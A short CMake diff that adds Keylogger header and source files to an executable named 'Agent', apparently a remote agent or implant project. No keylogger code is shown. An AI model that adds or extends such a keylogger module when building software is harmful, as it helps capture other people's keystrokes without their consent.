@@ -24,6 +24,8 @@ add_executable (
   "include/Agent.h"
   "src/TaskQueueManager.cpp"
   "include/TaskQueueManager.h"
+  "include/Keylogger.h"
+  "src/Keylogger.cpp"
 )
 
 target_include_directories(Agent PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/external)
